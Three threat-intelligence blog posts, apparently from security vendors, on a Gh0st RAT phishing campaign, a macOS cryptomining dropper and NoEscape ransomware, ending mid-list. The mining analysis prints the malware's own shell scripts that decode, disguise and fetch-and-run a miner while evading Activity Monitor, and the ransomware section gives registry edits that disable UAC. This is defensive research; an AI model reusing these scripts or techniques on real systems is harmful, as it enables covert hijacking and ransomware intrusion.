title: Open-Source Gh0st RAT Still Haunting Inboxes 15 Years After Release url: https://cofense.com/blog/open-source-gh0st-rat-still-haunting-inboxes-15-years-after-release/ Found in Environments Protected By: Proofpoint By Nathaniel Raymond, Cofense Intelligence Gh0st RAT, a decades-old open-source remote administration tool (RAT), recently appeared in phishing campaigns targeting a healthcare organization.
Gh0st
Remote Administration Tool was created by a Chinese hacking group named C. Rufus Security Team that released it publicly in 2008.
The public release of Gh0st RAT source code made it easy for threat actors to obtain and tailor the tool to their needs.
Its feature set expanded over the years to include various surveillance, persistence, and information-stealing capabilities: Taking full control of the infected machine Recording keystrokes in real time with offline logging available Accessing live web cam feeds including microphone recording Downloading files remotely Remote shutdown and reboot Disabling user input Over Gh0st RAT’s long life, Chinese nation-state threat actors have used it to breach high-value targets such as governments, embassies, economic targets, and media.
One such breach was the operation known as “GhostNet” in 2009, in which a large-scale cyber-attack used Gh0st RAT to conduct surveillance and espionage.
The breach impacted the Dalai Lama’s Tibetan exile centers in multiple countries. 
Although Gh0st RAT was first identified in reports of threat activity almost 15 years ago, it is still actively distributed today.
Cofense Intelligence identified an email targeting a European-owned medical technology organization located in China, attempting to deliver Gh0st RAT via an embedded link.
The embedded link that hosted the malware was affiliated with Tencent and based in Hong Kong.
The sample’s command and control (C2) server is also located on the CHINANET Jiangsu province network in the city of Nanjing. 
Figure 1: A screenshot of the recent phishing email used to deliver Gh0st RAT via an embedded link. 
Figure 2: A translation of the body of the recent Gh0st RAT campaign shows that it used an unpaid invoice as a theme. 
Although Ghost RAT has a history of use by nation-state threat actors, Cofense Intelligence does not have conclusive evidence that this recent campaign is associated with known nation-state activity.
The activity we observed activity shares certain characteristics with some advanced persistent threat (APT) groups, including APT27, which is known for intellectual property theft against healthcare and technology companies, and is also known for the use of Gh0st RAT.
However, since Gh0st RAT’s source code is publicly available, it remains plausible that any threat actor could download and modify the code for their own needs.
With Chinese universities (including more than one in Nanjing) being heavily involved in training talent for the Chinese defense industry, it is also plausible that students or other threat actors that are at times associated with APT groups may be carrying out independent threat activity using tools they are familiar with. 
Figure 3: Details of the recent Gh0st RAT sample’s C2 server on the network information service Shodan. 
Indicators of Compromise Files 1680478346389.zip MD5: 9e6c45b6b8b20bf3c5959dbba8f27117 LiveUpdate360.dat MD5: f149d3f3ef0361ebe4d346811f29b527 LiveUpdate.exe MD5: 96e4b47a136910d6f588b40d872e7f9d setting.ini MD5: 91aab4bbe634be62d11d132738c23a82 SqlVersion9.dll MD5: 317f9ff06c076e87e5b1d11242396d5f ú¿╡τ-╫╙-╖ó-╞▒ú⌐.exe MD5: 4723a2a8f68c1eaf82809cff29b8e56f URLs hxxps://api[.]youkesdt[.]asia/admin/down/hash/79b7c6ed-c4d8-4b36-b1cd-f968e6570010 hxxp://datacache[.]cloudservicesdevc[.]tk/picturess/2023/SqlVersion9[.]dll hxxp://datacache[.]cloudservicesdevc[.]tk/picturess/2023/Media[.]xml hxxp://datacache[.]cloudservicesdevc[.]tk/picturess/2023/LiveUpdate360[.]dat hxxp://datacache[.]cloudservicesdevc[.]tk/picturess/2023/LiveUpdate[.]exe hxxp://datacache[.]cloudservicesdevc[.]tk/picturess/2023/223[.]114[.]txt Command and Control hxxp://61[.]160[.]223[.]114:18076 All third-party trademarks referenced by Cofense whether in logo form, name form or product form, or otherwise, remain the property of their respective holders, and use of these trademarks in no way indicates any relationship between Cofense and the holders of the trademarks.
Any observations contained in this blog regarding circumvention of end point protections are based on observations at a point in time based on a specific set of system configurations.
Subsequent updates or different configurations may be effective at stopping these or similar threats.
Past performance is not indicative of future results. 
The Cofense:registered: and PhishMe:registered: names and logos, as well as any other Cofense product or service names or logos displayed on this blog are registered trademarks or trademarks of Cofense Inc. 
The post Open-Source Gh0st RAT Still Haunting Inboxes 15 Years After Release appeared first on Cofense. 
title: CrowdStrike Uncovers I2Pminer MacOS Mineware Variant url: https://www.crowdstrike.com/blog/i2pminer-macos-mineware-analysis/ CrowdStrike analyzed an I2Pminer variant that targets macOS 
The mineware utilizes I2P to hide XMRig network traffic The CrowdStrike Falcon:registered: platform provides continuous protection against mineware threats by offering real-time visibility across workloads CrowdStrike recently analyzed a macOS-targeted mineware campaign that utilized malicious application bundles to deliver open source XMRig cryptomining software and Invisible Internet Protocol (I2P) network tooling. 
Research began after identifying suspicious multi-architecture binaries within a public malware repository.
Analysis of common samples shows that the techniques in this campaign date back to the summer of 2021.
The identified applications shared a common theme: identifying as Apple Logic Pro X, Final Cut Pro, Traktor or various Adobe Creative Suite products.
The primary executable is a dropper containing a legitimate version of the application and I2P tooling.
Utilizing I2P, the dropper then downloads a custom XMRig miner and orchestrates the mining operations. 
Open source reporting1 also observed similar usage of I2P and XMRig, but the previous threats did not involve the same usage of a legitimate application and scripts to deploy its tooling. 
The CrowdStrike Falcon platform provides continuous protection against cryptomining threats by delivering real-time visibility across workloads to protect customers. 
Technical Analysis This campaign lures the victim into believing that they are installing a legitimate application for successful execution.
The malicious dropper contains a legitimate version of the software and executes it to give the illusion of a properly behaving application.
It then relies on a number of shell scripts to configure and orchestrate its mining operations.
The following analysis was performed on a binary that drops and executes a copy of Apple Logic Pro X (bfa9f7b8014efab4143fb2a77732257144f3b804ee757fb41c9971b715da53d7). 
Installation It is likely that these malicious application bundles are distributed via Apple Disk Images (DMGs).
The malicious application bundles were observed executing out of the /Applications/ folder.
DMGs are a common delivery mechanism for both benign and malicious software.
It is typical for DMGs to instruct users to drag and drop application bundles from the mounted disk image to the application folder. 
Dropper Binary At the core of these malicious application bundles is a Mach-O binary acting as a dropper.
Binaries were found to be universal Mach-Os, supporting both x86_64 and ARM architectures.
The dropper binary is located within the installed application bundle at /Applications/Logic Pro X.app/Contents/MacOS/Logic Pro X.
Therefore, it executes when the application bundle is launched.
The dropper is responsible for orchestrating the installation and execution of the legitimate application, I2P tooling and XMRig miner.
Figure 2 outlines the multiple layers of process execution. 
Figure 2.
Dropper execution diagram (click to enlarge) 
Throughout the dropper’s lifecycle, it heavily relies on randomly generated names for folders and files in the /tmp/ directory.
The dropper binary generates a number of these file paths through its own random character generator and dynamically produces the script content with these generated values.
The scripts also rely heavily on the usage of mktemp to generate variables within the scripts.
Both of these methods produce files with the syntax of ._[a-zA-Z]{8} (e.g., ._JdYdPLMq).
Files produced within the Mach-O are generated with 10 characters, whereas usage of mktemp within the scripts produces files made of eight characters. 
Legitimate Application Dropper Script 
In order to appear as a working copy of Logic Pro X, the dropper contains a legitimate copy of the lure application.
The dropper starts by generating a script to decode the legitimate Mach-O file.
During this process a large Base64-encoded file is written to disk.
An example of this script can be found in the Appendix.
Its purpose is to create a mirrored application bundle located in the host’s /tmp/ directory.
The mirrored bundle contains the legitimate application instead of the dropper binary. 
The generated script is executed via a /bin/sh subprocess.
The script removes any files that conflict with its randomly generated paths.
Then it creates a new folder structured for the bundle located at /tmp/._[a-zA-Z]{10}/Logic Pro X.app/Contents.
It creates symbolic links in the /tmp/ bundle to mirror all directories found in /Applications/Logic Pro X.app/Contents and /Applications/Logic Pro X.app/Contents/MacOS to their respective /tmp/ locations.
All files located in /Applications/Logic Pro X.app/Contents folder are copied to their respective /tmp/ location.
The Logic Pro X dropper binary is deleted with the /tmp/ bundle.
It will be replaced with the legitimate application.
In order to unpack the legitimate binary, the previously written Base64 file is decoded and unarchived.
The contents are saved to /tmp/._[a-zA-Z]{10}/Logic Pro X.app/Contents/MacOS/Logic Pro X.
The script’s final action is to set the executable bit of this binary. 
The dropper then forks itself in order to launch the legitimate application.
The forked process makes a call to execl to execute the legitimate Logic Pro X application located in /tmp/. 
The original dropper process continues to execute in order to orchestrate the mining operations.
It relies on two additional scripts to configure the I2P network tooling and download the XMRig mining software. 
I2P Dropper Script I2P is an anonymous network layer.
All communications over I2P are anonymous and end-to-end encrypted, and users of the network don’t reveal their real IP addresses.
The dropper binary unpacks a customized Mach-O compiled from the open source i2pd (I2P Daemon) project.
Usage of i2pd enables other processes on the computer to tunnel traffic to the I2P network.
I2P is configured and used by the dropper to download the mining tooling but also to proxy the miner’s network communications. 
The I2P dropper script is written to disk at /tmp/._[a-zA-Z]{10}.
An example of the script can be found in the Appendix.
The script is executed as a /bin/sh subprocess. 
The script first deletes itself from the disk.
This is done to evade detection but also to open up the opportunity to reuse the same randomly generated filename for the actual i2pd binary.
The i2pd binary is stored within the script as a large, inline Base64-encoded variable.
This value is decoded and the output is written to an additional file (/tmp/._[a-zA-Z]{8}).
This file is read and unarchived to the original file path of the I2P dropper script.
The script pads the resulting Mach-O with a random number of \x00 bytes.
The padded i2pd Mach-O file is executed via a call to exec -a "/System/Library/Frameworks/CoreServices.framework/Frameworks/Metadata.framework/Versions/N/Support/mdworker_shared" "$0" Note that $0 will resolve the first argument of the current process.
This is the file path of the I2P dropper script, which was replaced with the padded i2pd Mach-O file.
The exec call will execute the binary and modify the process name to the mdworker_shared file path.
After the process executes, the I2P dropper script removes the i2pd Mach-O file from the disk. 
i2pd The I2P Daemon binary dropped by the Logic Pro X dropper is tooling built using version 2.41.0 of the open source project.
It is a universal binary supporting both x86_64 and ARM architectures. 
Public i2pd binaries rely on config files or command line arguments for necessary configuration of tunnels and upstream connections.
The binary used in this threat is custom tooling developed on top of the i2pd code base.
In addition to running the I2P network stack, it also contains static configuration elements necessary for the operation of the XMRig miner.
This allows it to minimize command line arguments and additional files dropped to disk. 
The custom binary is built to configure two tunnels from the local host to the I2P network.
These tunnels are responsible for the localhost listeners on ports 4444 and 4445.
The listener utilizing port 4444 is called “pool” while the listener utilizing port 4445 is labeled “payload.”
These align with their usage by the XMRig downloader and miner.
Each tunnel is configured to tunnel traffic to an upstream address within the I2P network.
The following chart summarizes the tunnels and their configurations. 
Label Type Local Address Local Port Destination Address pool client 127.0.0.1 4444 hghsfkrat5dd7ikqzk3d3h5jattjxlru6zmxzxd7y3wib6goodmq.b32[.]i2p payload client 127.0.0.1 4445 jiasil3a7kcxitu4swlixbnyt6wbbm65kqknqknnvkj2yvj7lliq.b32[.]i2p 
The host now has a running i2pd process.
This will enable it to use the I2P network for the XMRig download, and to handle the miner’s network communications. 
XMRig Downloader Script XMRig is an open source CPU/GPU miner that supports numerous protocols.
The dropper generates and executes a script to download, configure and execute a copy of a XMRig miner.
The script is executed as a command line argument passed into a /bin/sh -c
[scriptcontent] subprocess. 
This script is executed by the Mach-O dropper before the I2P Dropper script, but its first step is to sit in a loop and wait for the creation of the /tmp/i2pd directory.
This directory is generated during the execution of the I2P Dropper script.
After this file is detected, the XMRig downloader starts a second I2P Daemon process and saves the new pid to /tmp/i2pd.
The script then removes any files that conflict with its randomly generated paths. 
The script then enters a download loop that contains two subloops, one to download the MD5 hash of the XMRig payload, and a second to download the XMRig payload.
During the first subloop, curl is used to download a MD5 hash from http://127.0.0[.]1:4445/updtmd.
This localhost port is configured to tunnel traffic through i2pd to the destination address listed above.
This loop attempts the download every five seconds until it is successful.
During this loop, the script implements a check using pgrep for Activity Monitor processes in an attempt to evade user detection.
If Activity Monitor is detected then execution is stopped and the script exits.
If the MD5 hash is successfully downloaded, its value is saved and execution is passed to the second subloop.
This second subloop performs the same actions but instead pulls the XMRig payload from http://127.0.0[.]1:4445/update.
If this download is successfully written to disk, it is hashed and the value is compared to the previously downloaded MD5 hash.
If the hashes are equal, execution proceeds past the download loop — otherwise, the outer download loop is reevaluated. 
The XMRig payload is then extracted from the download via tar, and the resulting Mach-O file is padded with a random number of \x00 bytes.
Similar to the ip2d process, it is executed via an exec -a call utilizing a process name of /System/Library/Frameworks/CoreServices.framework/Frameworks/Metadata.framework/Versions/N/Support/mdworker_local Next, the XMRig Download Script sends the XMRig miner a config via the XMRig miner’s native API.
In order to accomplish this, curl is used to send a post message to http://127.0.0[.]1:4543/1/config.
Port 4543 is the default listening port for XMRig’s API.
An example of this config can be found in the Appendix.
The script enters a final loop to once again check for the presence of an Activity Monitor process.
If Activity Monitor is running, the script kills the I2P Daemon and XMRig miner processes and exits. 
XMRig The XMRig binary dropped by the Logic Pro X dropper is also custom tooling built using version 6.18.1 of the open source project.
This is also a universal binary supporting both x86_64 and ARM architectures. 
The binary’s source is modified to execute with an altered default configuration.
Similar to the I2P Daemon, this is done to minimize command line arguments.
The binary does not need a command line miner config.
The http API is also enabled by default.
This is done so that no configs need to be passed via the command line and that the config can be sent via curl within the XMRig download script. 
The config also reveals a few details about the mining operations.
The existence of a donate-over-proxy value and the usage of generic user and password values within the XMRig configuration reveal the usage of a mining proxy.
The usage of a proxy allows authors to control all of their mining implants and their target pools via a centralized console.
This proxy server is located on the I2P network at the destination of the pool tunnel. 
The XMRig implant will execute until the user logs off, shuts down their computer or opens Activity Monitor.
With the observed configuration, it will utilize the I2P network and the mining proxy to perform CPU mining operations on the host. 
Defense Evasion The dropper binary and its scripts utilize a number of techniques to avoid detection. 
The dropper bundle in the applications folder appears legitimate, and this bundle houses all of the Logic Pro X dependencies/frameworks.
The authors cleverly utilized these legitimate dependencies via symbolic links when dynamically creating the legitimate bundle in the temp folder. 
Even though the scripts produce many on-disk artifacts, the dropper and scripts are quick to remove them as soon as they are executed or used.
The i2pd and XMRig binaries are padded with a random number of zero bytes to change its hash and expand its size.
They also both use CoreServices framework binaries as the execution name.
This is so that it can blend in within process tree/process viewers. 
Mining-related CPU spikes can be difficult to notice due to the system resource-intensive applications that were chosen.
If these spikes are noticed, the implant is also quick to kill itself and clean up its on-disk artifacts if it determines the user is investigating system resources via Activity Monitor. 
Persistence The dropper does not establish persistence through typical means, instead relying on the lure of its legitimate application for execution.
The mining infrastructure is dropped, downloaded and deleted every time the dropper executes.
As long as the dropper successfully launches its legitimate application, the user will continue to execute the dropper under the assumption that it is legitimate. 
Dropper Variant A related group of dropper variants was also identified (e.g., 27158886ab064880aa5d5196248f2ad4b20b38bbb1321f72bca17351165ea3e5).
These variants are distributed by a malicious application bundle that contains a setup script, legitimate application and Mach-O dropper.
All three files are distributed within the Contents/MacOS directory in the application bundle.
The setup script is the app bundle’s primary executable and serves to execute the legitimate binary, copy the Mach-O dropper to /tmp/._[a-zA-Z]{10} and execute the relocated Mach-O. Similar to the techniques and analysis above, the Mach-O dropper installs i2pd and the XMRig miner.
The variants utilize the same variable names and directory naming schema, and also date back to Summer 2021. 
The CrowdStrike Falcon Platform’s Continuous Monitoring and Visibility The Falcon platform takes a layered approach to protect workloads.
Using on-sensor and cloud-based machine learning, behavior-based detection using indicators of attack (IOAs), and intelligence related to tactics, techniques and procedures (TTPs) employed by threats and threat actors, the Falcon platform enables visibility, threat detection and continuous monitoring for any environment, reducing the time to detect and mitigate threats. 
The industry-leading CrowdStrike Falcon platform sets the new standard in cybersecurity.
Watch this demo to see the Falcon platform in action. 
The Falcon platform prevents I2Pminer at various steps throughout its execution, detecting and preventing behavior such as the suspicious dropper script (see Figure 3).
CrowdStrike’s proactive research targeted the behavior of this malware.
It was discovered that some preventions already applied to the variants before it was known to our researchers.
To reinforce the layered approach, our teams have since added even more coverage, resulting in several preventions that apply to various stages in the chain. 
Figure 3.
Suspicious command line execution (click to enlarge) To maximize protection, CrowdStrike recommends enabling the following prevention policy visibility and configuration toggles. 
Toggle Prevention Policy Category Description Script-Based Execution Monitoring Sensor Visibility Provides visibility into suspicious scripts, including shell and other scripting languages. 
Suspicious Processes Execution Blocking Block processes that CrowdStrike analysts classify as suspicious.
These are focused on dynamic IOAs, such as malware, exploits and other threats. 
See for yourself how the industry-leading CrowdStrike Falcon platform protects against modern threats like wipers and ransomware.
Start your 15-day free trial today. 
MITRE ATT&CK Framework Tactic Technique Description Execution Command and Scripting Interpreter:
Unix Shell (T1059.004) 
The dropper utilizes /bin/sh for subprocess execution. 
User Execution (T1204) 
The dropper is executed by the user. 
Defense Evasion Deobfuscate/Decode Files or Information (T1140) Files are dropped/downloaded as Base64-encoded archives. 
Indicator Removal: File Deletion (T1070.004) 
Files are deleted after use. 
Masquerading: Match Legitimate Name or Location (T1036.005) 
The dropper is installed into a legitimate file path, posing as the legitimate application. i2pd and XMRig also utilize legitimate file paths to mask their execution. 
Command and Control Protocol Tunneling (T1572) XMRig download and mining communications are tunneled through the I2P network layer. 
Impact Resource Hijacking (T1496) XMRig utilizes system resources for mining operations. Indicators of Compromise (IOCs) Files File SHA256 Dropper (Logic Pro X) bfa9f7b8014efab4143fb2a77732257144f3b804ee757fb41c9971b715da53d7 i2pd a22b48ce098ad4b082c4f4de78c708294e08212ab8dfd818642f7922c8e794c3 XMRig 86019af5850b01c6c6c9c724e0468a891947b2ef5da930405a30342f1e6ae5eb Dropper (Variant) 27158886ab064880aa5d5196248f2ad4b20b38bbb1321f72bca17351165ea3e5 I2P Domains Domain hghsfkrat5dd7ikqzk3d3h5jattjxlru6zmxzxd7y3wib6goodmq.b32[.]i2p jiasil3a7kcxitu4swlixbnyt6wbbm65kqknqknnvkj2yvj7lliq.b32[.]i2p Appendix Legitimate Application Script sh -c SCRIPTPATH=$( cd -- "$(dirname "/Applications/Logic Pro X.app/Contents/MacOS/Logic Pro X")/.."
>/dev/null 2>&1 ; pwd -P );BLOB_PATH="/tmp/._KbmflZqwXa";IMG_SP_PATH="/tmp/._bHOospjBUL";[ -f "$IMG_SP_PATH" ] && rm -rf "$IMG_SP_PATH";[ -d "$IMG_SP_PATH" ] && rm -rf "$IMG_SP_PATH";TMPDIR="$IMG_SP_PATH/Logic Pro X.app/Contents";mkdir -p
"$TMPDIR";( find "$SCRIPTPATH" -type d -mindepth 1 -maxdepth 1 -exec ln -s
../ {} "$TMPDIR" \;)
> /dev/null 2>&1;rm
-rf
"$TMPDIR/MacOS";mkdir "$TMPDIR/MacOS";(find "$SCRIPTPATH" -type f -maxdepth 1 -exec cp {} "$TMPDIR" \;) > /dev/null 2>&1;(find "$SCRIPTPATH/MacOS" -type f -mindepth 1 -maxdepth 1 -exec ln -s ../ {} "$TMPDIR/MacOS" \;) > /dev
/null 2>&1;APP_MACH="$TMPDIR/MacOS/Logic Pro X";rm
-rf "$APP_MACH";CT=$(mktemp /tmp/._XXXXXXXX);cat "$BLOB_PATH" | base64 -o "$CT" -d;tar -xf
"$CT" -O >"$APP_MACH";rm -rf "$CT";rm -rf "$BLOB_PATH";chmod +x "$APP_MACH"; I2P Dropper Script #!/bin/bash rm -rf "$0";I2PCTMPFILE=$(mktemp /tmp/._XXXXXXXX);I2PBASE64BLOB="[base64 blob]";echo $I2PBASE64BLOB | base64 -o "$I2PCTMPFILE" -d;tar -xf "$I2PCTMPFILE" -O > "$0";head -c $(($RANDOM*$((1 + RANDOM % 1000))))
/dev/zero >>
"$0";rm -rf "$I2PCTMPFILE";chmod +x "$0";(( exec -a "/System/Library/Frameworks/CoreServices.framework/Frameworks/Metadata.framework/Versions/N/Support/mdworker_shared" "$0" ) & echo $! >
"/tmp/i2pd/._pid");sleep 3 && rm -rf "$0";exit XMRig Downloader Script sh -c /System/Library/Frameworks/Quartz.framework/Versions/A/Frameworks/QuickLookUI.framework/Versions/A/XPCServices/QuickLookUIService.xpc/Contents/MacOS/mdworker-bundle -s mdworker-bundle -c MDSImporterBundleFinder -m
com.apple.metadata.mdbulkimport > /dev/null 2>&1;appId="[uniqueid]";r_nme="BGlyVRaZgH";r_i2="QSRqPzSHBd";tmr="\u000c";rnd_sz="2521286";PLD="update";MD5="updtmd";[ ! -d "/tmp/i2pd" ] && mkdir "/tmp/i2pd"; (( while true; do sleep 1; [ -f "/tmp/i2pd/._pid" ] && break;done; PID=$(cat "/tmp/i2pd/._pid") && rm -rf "/tmp/i2pd/._pid"; chmod +x "/tmp/._${r_i2}"; ("/tmp/._${r_i2}" &); while true; do sleep 2; [ -f "/tmp/i2pd/._pid" ] && break;done; I2PD_PID=$(cat "/tmp/i2pd/._pid") && rm -rf "/tmp/i2pd/._pid"; tmpwd="/tmp"; d_p="$tmpwd/._${r_nme}"; d_md5="$tmpwd/._${r_nme}_md5"; [ -d "$d_p" ] && rm -rf "$d_p"; [ -d "$d_md5" ] && rm -rf "$d_md5"; [ -f "$d_p" ] && rm -rf "$d_p"; [ -f "$d_md5" ] && rm -rf "$d_md5"; complete="false"; finished="false"; while [ "$complete" !
= "true" ]; do while [ "$finished" !
= "true" ]; do curl --silent -o "$d_md5" "http://127.0.0.1:4445/$MD5"; [ -f "$d_md5" ] && finished="true" && md2=$(cat "$d_md5") && rm -rf "$d_md5"; sleep 5; (pgrep -x 'Activity Monitor' > /dev/null) && ([ "$I2PD_PID" !
= "" ] && kill -9 "$I2PD_PID" >
/dev/null 2>&1;[ "$PID" !
= "" ] && kill "$PID" >
/dev/null 2>&1;pkill
"._${r_i2}";exit); done; finished="false"; while [ "$finished" !
= "true" ]; do curl --silent -o "$d_p" "http://127.0.0.1:4445/$PLD"; [ -f "$d_p" ] && finished="true" && md1=$(md5 -q "$d_p"); sleep 5; (pgrep -x 'Activity Monitor' > /dev/null) && ([ -f "$d_p" ] && rm -rf "$d_p";[ "$I2PD_PID" !
"._${r_i2}";exit); done; [[ "$md1" == "$md2" ]] && complete="true"; done; TMPFILE=$(mktemp /tmp/._XXXXXXXX);
tar -xf "$d_p" -O > "$TMPFILE"; rm -rf "$d_p"; mv "$TMPFILE" "$d_p"; head -c $rnd_sz /dev/zero >>
"$d_p"; chmod +x "$d_p"; (( exec -a "/System/Library/Frameworks/CoreServices.framework/Frameworks/Metadata.framework/Versions/N/Support/mdworker_local" "$d_p" ) & echo $! >
"/tmp/i2pd/._pid"); PIDW=$(cat "/tmp/i2pd/._pid") && rm -rf "/tmp/i2pd/._pid"; sleep 9; XARCH=$(uname -m); [[ "$XARCH" == "x86_64" ]] && HP=true ||
HP=false; echo '{ "api": { "id": null, "worker-id": null }, "http": { "enabled": true, "host": "127.0.0.1", "port": 4543, "access-token": 2, "restricted": false }, "autosave": true, "background": false, "colors": true, "title": true, "randomx": { "init": -1, "init-avx2": -1, "mode": "auto", "1gb-pages": false, "rdmsr": true, "wrmsr": true, "cache_qos": false, "numa": true, "scratchpad_prefetch_mode": 1 }, "cpu": { "enabled": true, "huge-pages": '$HP', "huge-pages-jit": false, "hw-aes": null, "priority": null, "memory-pool": false, "yield": true, "max-threads-hint": 25, "asm": false, "argon2-impl": null, "astrobwt-max-size": 550, "astrobwt-avx2": false, "cn/0": false, "cn-lite/0": false }, "opencl": { "enabled": false, "cache": true, "loader": null, "platform": "AMD", "adl": true, "cn/0": false, "cn-lite/0": false }, "cuda": { "enabled": false, "loader": null, "nvml": true, "cn/0": false, "cn-lite/0": false }, "donate-level": 0, "donate-over-proxy": 1, "log-file": null, "pools": [ { "algo": null, "coin": null, "url": "127.0.0.1:4444", "user": "x", "pass": "x", "rig-id": "'${XARCH:0:1}${appId:0:7}'", "nicehash": true, "keepalive": false, "enabled": true, "tls": false, "tls-fingerprint": null, "daemon": false, "socks5": null, "self-select": null, "submit-to-origin": false } ], "print-time": 60, "health-print-time": 60, "dmi": true, "retries": 5, "retry-pause": 5, "syslog": false, "tls": { "enabled": false, "protocols": null, "cert": null, "cert_key": null, "ciphers": null, "ciphersuites": null, "dhparam": null }, "user-agent": null, "verbose": 0, "watch": true, "pause-on-battery": false, "pause-on-active": false }'|curl --silent --data-binary @- -H "Expect: 2400" -H "Content-Type: application/json" -H "Authorization: Bearer 2" http://127.0.0.1:4543/1/config >
/dev/null; [ -f "$d_p" ] && rm -rf "$d_p"; (APID=$$;(while true; do sleep 3;(pgrep -x 'Activity Monitor' > /dev/null) && break;done;); [ "$I2PD_PID" !
/dev/null 2>&1; [ "$PIDW" !
= "" ] && kill "$PIDW" > /dev/null 2>&1; [ "$PID" !
= "" ] && kill "$PID" > /dev/null 2>&1; pkill "._${r_nme}"; pkill "._${r_i2}"; kill "$APID" > /dev/null 2>&1;); exit) & echo $! >
"/tmp/i2pd/._pid"); XMRig Config { "api": { "id": null, "worker-id": null }, "http": { "enabled": true, "host": "127.0.0.1", "port": 4543, "access-token": 2, "restricted": false }, "autosave": true, "background": false, "colors": true, "title": true, "randomx": { "init": -1, "init-avx2": -1, "mode": "auto", "1gb-pages": false, "rdmsr": true, "wrmsr": true, "cache_qos": false, "numa": true, "scratchpad_prefetch_mode": 1 }, "cpu": { "enabled": true, "huge-pages": "$HP", "huge-pages-jit": false, "hw-aes": null, "priority": null, "memory-pool": false, "yield": true, "max-threads-hint": 25, "asm": false, "argon2-impl": null, "astrobwt-max-size": 550, "astrobwt-avx2": false, "cn/0": false, "cn-lite/0": false }, "opencl": { "enabled": false, "cache": true, "loader": null, "platform": "AMD", "adl": true, "cn/0": false, "cn-lite/0": false }, "cuda": { "enabled": false, "loader": null, "nvml": true, "cn/0": false, "cn-lite/0": false }, "donate-level": 0, "donate-over-proxy": 1, "log-file": null, "pools": [ { "algo": null, "coin": null, "url": "127.0.0.1:4444", "user": "x", "pass": "x", "rig-id": "'${XARCH:0:1}${appId:0:7}'", "nicehash": true, "keepalive": false, "enabled": true, "tls": false, "tls-fingerprint": null, "daemon": false, "socks5": null, "self-select": null, "submit-to-origin": false } ], "print-time": 60, "health-print-time": 60, "dmi": true, "retries": 5, "retry-pause": 5, "syslog": false, "tls": { "enabled": false, "protocols": null, "cert": null, "cert_key": null, "ciphers": null, "ciphersuites": null, "dhparam": null }, "user-agent": null, "verbose": 0, "watch": true, "pause-on-battery": false, "pause-on-active": false } Endnote https://www.trendmicro.com/en_us/research/22/b/latest-mac-coinminer-utilizes-open-source-binaries-and-the-i2p-network.html Additional Resources Learn how the powerful CrowdStrike Falcon platform provides comprehensive protection across your organization, workers and data, wherever they are located. 
Get a full-featured free trial of CrowdStrike Falcon Prevent and see for yourself how true next-gen AV performs against today’s most sophisticated threats. 
title: Evasive NoEscape Ransomware Uses Reflective DLL Injection url: https://blog.cyble.com/2023/06/04/evasive-noescape-ransomware-uses-reflective-dll-injection/ New Ransomware-as-a-service (RaaS) Targeting Vmware ESXi Servers Recently, Cyble Research & Intelligence Labs (CRIL) detected the emergence of a fresh Ransomware-as-a-Service (Raas) initiative called ‘NoEscape.’
This program was discovered to be promoted on a cybercrime forum towards the end of May 2023.
The creators of NoEscape were actively seeking affiliates to join their network.
CRIL has shared the details of this discovery through the latest blog post. 
Following that, EVIL RABBIT, a security researcher on Twitter with the handle @D4RKR4BB1T47, recently shared a tweet featuring a picture of the dashboard panel used by the NoEscape ransomware group. 
The figure below shows the post by security researcher EVIL RABBIT. 
Figure 1 – NoEscape RaaS Affiliate Panel (Source: EVILRABBIT) 
In addition to sharing the dashboard panel image, the security researcher also provided images of the RaaS builder page and accompanying samples associated with this specific ransomware family.
The affiliate website of NoEscape RaaS offers a range of executable building options, including EXE and DLL files for Windows 7 and above, reflective DLL injection for Windows 7 and above, executable files for Windows XP, and ELF executables for Linux/ESXi servers.
The affiliate page includes instructions for customizing the ransomware executables, such as specifying the ransomware name, ransomware key name, comment, price or ransom amount, and timer type (None, double, or leak). 
According to the provided screenshot, the NoEscape RaaS platform offers affiliates the option to choose between generating a single encryption key for all binaries or creating distinct keys for each individual binary.
This flexibility allows affiliates to tailor their approach and encryption strategy based on their specific requirements or preferences. 
The ransomware builder interface allows affiliates to configure various settings for building the ransomware executables.
These settings include specifying the size of large files where partial encryption is applied instead of encrypting the entire file, defining the primary path for encryption, specifying file paths to skip during encryption, targeting specific services and processes, configuring autorun entries, enabling auto ransom note opening, and even changing wallpapers on infected systems. 
The below figure shows the screenshot of the NoEscape ransomware builder page. 
Figure 2 – NoEscape RaaS Executable Builder Page Screenshot (Source: EVIL RABBIT) Technical Details Windows Variant We have taken the below sample hash for the purposes of this analysis: (SHA256), 68ff9855262b7a9c27e349c5e3bf68b2fc9f9ca32a9d2b844f2265dccd2bc0d8, which is a GUI-based x32 bit executable written in Microsoft Visual C/C++ compiler. 
Figure 3 – File details Upon execution, the ransomware first creates a mutex named “Global\\{5d202e6e-b33a-4833-abfb-2391bc075089}” to ensure that only a single instance of the malware is running on the victim’s system. 
UAC BYPASS After creating the mutex, the ransomware modifies specific registry values to disable User Access Control (UAC), a security feature in Windows.
UAC prompts users for permission or administrator credentials before allowing actions that could affect system settings or files.
By deactivating UAC, the ransomware gets elevated privileges without requiring user permission or administrator credentials.
This enables the malware to carry out malicious activities on the system without difficulty, posing a significant risk to the system’s security. 
EnableLUA By modifying the below registry value EnableLUA to “0”, malware aims to deactivate User Account Control (UAC) on the target system.
UAC is typically set to “1” by default. 
Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA = “0” ConsentPromptBehaviorAdmin The ConsentPromptBehaviorAdmin key has been set to “0”, indicating that the behavior of the consent prompt for actions requiring administrator privileges has been modified.
By default, this value is typically set to “1”.
The consent prompt serves to ask for confirmation or administrator credentials from the user before permitting the action to proceed. 
Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin = “0” Kill Processes/Services After bypassing UAC, the ransomware terminates several processes, including 360doctor, GDscan, RTVscan, Apache, CCleaner, OneDrive, and others, if they are currently running on the victim’s machine. 
The figure below shows the list of process names targeted by the NoEscape ransomware. 
Figure 4 – List of Processes to Terminate Furthermore, the ransomware stops various active services on the system, including culserver, SQL, SQL Server, sophos, vmware-converter, VSS, and others. 
The below figure shows the list of services targeted by the ransomware by service name. 
Figure 5 – List of Services to Stop Prior to encrypting the files, the ransomware uses the FindFirstVolumeW() and FindNextVolumeW() API functions to search and identify accessible volumes on the targeted system.
Following this, the malware proceeds to drop a ransom note named “HOW_TO_RECOVER_FILES.txt” in multiple directories. 
Once the ransom note has been dropped, the malware proceeds to identify files and directories for encryption by iterating through them using the FindFirstFileW() and FindNextFileW() API functions.
The NoEscape ransomware excludes the below file extensions and folder names from encryption. 
